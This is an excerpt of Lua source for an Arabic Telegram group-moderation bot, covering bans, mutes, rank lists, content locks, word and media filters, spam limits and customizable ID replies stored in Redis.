Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if AliNight:sismember(Night..'Abs:SecondSudo:',result.id_) and not AbsSudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
AliNight:sadd(Night..'Abs:BanAll:', result.id_)
local gps = AliNight:scard(Night.."Abs:Groups")
...
if tonumber(user) == tonumber(Night) then  
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
...
if AliNight:sismember(Night..'Abs:AbsSudo:',user) and not Sudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if AliNight:sismember(Night..'Abs:SecondSudo:',user) and not AbsSudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
AliNight:sadd(Night..'Abs:BanAll:', user)
local gps = AliNight:scard(Night.."Abs:Groups")
...
if result.id_ then
AliNight:sadd(Night..'Abs:MuteAll:', result.id_)
local gps = AliNight:scard(Night.."Abs:Groups")
...
AliNight:srem(Night..'Abs:BanAll:', result.sender_user_id_)
...
if result.id_ then
AliNight:srem(Night..'Abs:BanAll:', result.id_)
AliNight:srem(Night..'Abs:MuteAll:', result.id_)
local gps = AliNight:scard(Night.."Abs:Groups")
...
AliNight:srem(Night..'Abs:BanAll:', user)
local gps = AliNight:scard(Night.."Abs:Groups")
...
AliNight:srem(Night..'Abs:MuteAll:', user)
local gps = AliNight:scard(Night.."Abs:Groups")
...
AliNight:setex(Night.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if AliNight:get(Night.."Abs:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not AliNight:get(Night..'Abs:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if AliNight:sismember(Night..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","✯︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","✯︙تم رفعه في قائمة المطايه") 
AliNight:sadd(Night..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not AliNight:get(Night..'Abs:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not AliNight:sismember(Night..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","✯︙هو ليس مطي ليتم تنزيله") 
else
AliNight:srem(Night..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
AliNight:del(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
AliNight:incrby(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم اضافة "..Num..' رساله', 1, 'md') 
end
...
function Reply(extra, result, success)
AliNight:incrby(Night..'Abs:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if AliNight:get(Night..'Abs:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then AliNight:sadd(Night.."Abs:cleaner"..msg.chat_id_, msg.id_) else AliNight:sadd(Night.."Abs:cleaner"..msg.chat_id_, msg.id_) end end end
if AliNight:get(Night..'Abs:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then AliNight:sadd(Night.."Abs:cleanernum"..msg.chat_id_, msg.id_) else AliNight:sadd(Night.."Abs:cleanernum"..msg.chat_id_, msg.id_) end end end
if AliNight:get(Night..'Abs:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then AliNight:sadd(Night.."Abs:cleanermusic"..msg.chat_id_, msg.id_) else AliNight:sadd(Night.."Abs:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if AliNight:sismember(Night.."Abs:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
...
local List = AliNight:smembers(Night..'Abs:VipMem:'..msg.chat_id_)
text = "✯︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
...
local List = AliNight:smembers(Night..Abs)
text = "✯︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = AliNight:get(Night..'Save:UserName'..v)
if username then
...
local List = AliNight:smembers(Night..'Abs:Managers:'..msg.chat_id_)
text = "✯︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = AliNight:get(Night..'Save:UserName'..v)
if username then
...
local List = AliNight:smembers(Night..'Abs:Constructor:'..msg.chat_id_)
text = "✯︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = AliNight:get(Night..'Save:UserName'..v)
if username then
...
local List = AliNight:smembers(Night..'Abs:Owner:'..msg.chat_id_)
text = "✯︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = AliNight:get(Night..'Save:UserName'..v)
if username then
...
if dp.first_name_ == false then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙حساب المنشئ محذوف", 1, "md")
return false  
end
...
keyboard = {} 
keyboard.inline_keyboard = {{{text=''..dp.first_name_..'',url="t.me/"..dp.username_ or NightTEAM}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
Ali_Night(msg.chat_id_, msg.id_,Text,1, 'md')
end
end,nil)   
end,nil)   
end
...
local List = AliNight:smembers(Night..'Abs:Muted:'..msg.chat_id_)
...
local List = AliNight:smembers(Night..'Abs:Tkeed:'..msg.chat_id_)
text = "✯︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = AliNight:get(Night..'Save:UserName'..v)
if username then
...
local List = AliNight:smembers(Night..'Abs:Ban:'..msg.chat_id_)
...
local List = AliNight:smembers(Night..'User:Donky:'..msg.chat_id_)
...
local List = AliNight:hkeys(Night..'Abs:Filters:'..msg.chat_id_)
text = "✯︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = AliNight:smembers(Night..'Abs:AbsSudo:')
...
local List = AliNight:smembers(Night..'Abs:SecondSudo:')
...
local BanAll = AliNight:smembers(Night..'Abs:BanAll:')
local MuteAll = AliNight:smembers(Night..'Abs:MuteAll:')
if #BanAll ~= 0 then 
...
local List = AliNight:smembers(Night..'Abs:SudoBot:')
text = "✯︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
...
AliNight:sadd(Night.."Abs:FilterSteckr"..msg.chat_id_,idsticker)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
AliNight:sadd(Night.."Abs:FilterPhoto"..msg.chat_id_,photo)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
AliNight:sadd(Night.."Abs:FilterAnimation"..msg.chat_id_,idanimation)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
AliNight:srem(Night.."Abs:FilterSteckr"..msg.chat_id_,idsticker)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
AliNight:srem(Night.."Abs:FilterPhoto"..msg.chat_id_,photo)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
AliNight:srem(Night.."Abs:FilterAnimation"..msg.chat_id_,idanimation)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..data.id_) or 0)
if AliNight:sismember(Night..'Abs:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif AliNight:sismember(Night..'Abs:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif AliNight:sismember(Night..'Abs:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif AliNight:sismember(Night..'Abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if AliNight:sismember(Night..'Abs:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n✯︙عدد الكروبات ↫ '..(AliNight:get(Night..'Abs:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
Ali_Night(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '✯︙نوع الحساب ↫ ❨ '..gr..' ❩\n✯︙الايدي ↫ ❨ '..res.id_..' ❩\n✯︙المعرف ↫ ❨ [@'..username..'] ❩\n✯︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Ali_Night(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..res.id_) or 0)
if AliNight:sismember(Night..'Abs:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif AliNight:sismember(Night..'Abs:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif AliNight:sismember(Night..'Abs:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif AliNight:sismember(Night..'Abs:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if AliNight:sismember(Night..'Abs:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n✯︙عدد الكروبات ↫ '..(AliNight:get(Night..'Abs:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..iduser) or 0)
if AliNight:sismember(Night..'Abs:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif AliNight:sismember(Night..'Abs:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif AliNight:sismember(Night..'Abs:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif AliNight:sismember(Night..'Abs:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if AliNight:sismember(Night..'Abs:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n✯︙عدد الكروبات ↫ '..(AliNight:get(Night..'Abs:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if AliNight:sismember(Night..'Abs:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
...
if result.id_ then
if AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if AliNight:sismember(Night..'Abs:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(Night) then  
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙انا البوت وليس لدي قيود', 1, 'md')  
...
AliNight:set(Night.."Abs:GpIds:Text"..msg.chat_id_,Text_Rand)
...
if text == 'الغاء' then   
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء حفظ كليشة الايدي', 1, 'md')
AliNight:del("Night:New:id:"..Night..msg.sender_user_id_)
return false
end
AliNight:del("Night:New:id:"..Night..msg.sender_user_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حفظ كليشة الايدي العامه', 1, 'md')
AliNight:set(Night.."Abs:AllIds:Text",text)
return false
end
...
AliNight:del(Night.."Abs:AllIds:Text")
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if text == 'الغاء' then   
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء حفظ كليشة الايدي', 1, 'md')
AliNight:del("Night:New:id:"..Night..msg.chat_id_..msg.sender_user_id_)
return false
end
AliNight:del("Night:New:id:"..Night..msg.chat_id_..msg.sender_user_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حفظ الكليشه الجديده', 1, 'md')
AliNight:set(Night.."Abs:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم حذف كليشة الايدي")  
AliNight:del(Night.."Abs:GpIds:Text"..msg.chat_id_)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.reply_to_message_id_ ~= 0 then
...
function NightTEAM(extra,Abs,success)
...
local msgsday = AliNight:get(Night..'Abs:UsersMsgs'..Night..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = AliNight:get(Night..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(AliNight:get(Night..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if AliNight:get(Night.."Abs:AllIds:Text") then
newpicid = AliNight:get(Night.."Abs:AllIds:Text")
...
if not AliNight:get(Night.."Abs:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Abs.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = AliNight:get(Night.."Abs:GpIds:Text"..msg.chat_id_)
...
if AliNight:get(Night.."Abs:AllIds:Text") then
newallid = AliNight:get(Night.."Abs:AllIds:Text")
...
if not AliNight:get(Night.."Abs:GpIds:Text"..msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = AliNight:get(Night.."Abs:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
...
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Ali_Night(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙عذرا الايدي معطل ', 1, 'md')
end
else
if AliNight:get(Night.."Abs:AllIds:Text") then
notpicid = AliNight:get(Night.."Abs:AllIds:Text")
...
if not AliNight:get(Night..'Abs:Lock:Id'..msg.chat_id_) then
if not AliNight:get(Night..'Abs:Lock:Id:Photo'..msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙معرفك ↫ ❨ "..username.." ❩\n✯︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n✯︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n✯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n✯︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n✯︙رسائلك ↫ ❨ "..user_msgs.." ❩\n✯︙تفاعلك ↫ "..formsgs(msguser).."\n✯︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
end
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙عذرا الايدي معطل', 1, 'md')
end end end
...
AliNight:set(Night..'Abs:Lock:EditMsgs'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not AliNight:get(Night..'Abs:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الفارسيه")  
AliNight:set(Night..'Abs:Lock:Farsi'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if AliNight:get(Night..'Abs:Lock:Fshar'..msg.chat_id_) then
...
AliNight:del(Night..'Abs:Lock:Taf'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if AliNight:get(Night..'Abs:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الكفر")  
AliNight:del(Night..'Abs:Lock:Kfr'..msg.chat_id_)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not AliNight:get(Night..'Abs:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل الفارسيه بالطرد")  
AliNight:set(Night..'Abs:Lock:FarsiBan'..msg.chat_id_,true)
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل البوتات بالحذف")  
AliNight:set(Night.."Abs:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل البوتات بالطرد")  
AliNight:set(Night.."Abs:Lock:Bots"..msg.chat_id_,"kick")  
end
...
AliNight:set(Night.."Abs:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not AliNight:get(Night..'Abs:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  AliNight:set(Night.."Abs:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","✯︙تم قفل التثبيت")  
AliNight:set(Night..'Abs:Lock:Pin'..msg.chat_id_,true)
AliNight:sadd(Night.."Abs:Lock:Pinpin",msg.chat_id_) 
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
AliNight:hset(Night.."Abs:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Manager(msg) then
...
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not AliNight:get(Night.."Abs:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
AliNight:set(Night.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
AliNight:setex(Night.."Abs:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
...
if text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ارسل لي الترحيب الان\n✯︙تستطيع اضافة مايلي ↫ ⤈\n✯︙دالة عرض الاسم ↫ firstname\n✯︙دالة عرض المعرف ↫ username', 1, 'md')
AliNight:set(Night..'Abs:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if AliNight:get(Night..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم الغاء حفظ الوصف", 1, 'md')
AliNight:del(Night..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
AliNight:del(Night..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
AliNight:set(Night..'Abs:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ارسل لي الوصف الان', 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ارسل لي الكلمه الان", 1, 'md') 
AliNight:set(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if AliNight:get(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر المنع', 1, 'md')
AliNight:del(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم منع الكلمه ↫ "..text, 1, 'html')
AliNight:del(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
AliNight:hset(Night..'Abs:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ارسل لي الكلمه الان", 1, 'md') 
AliNight:set(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if AliNight:get(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر الغاء المنع', 1, 'md')
AliNight:del(Night.."Abs:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not AliNight:hget(Night..'Abs:Filters:'..msg.chat_id_, text) then  
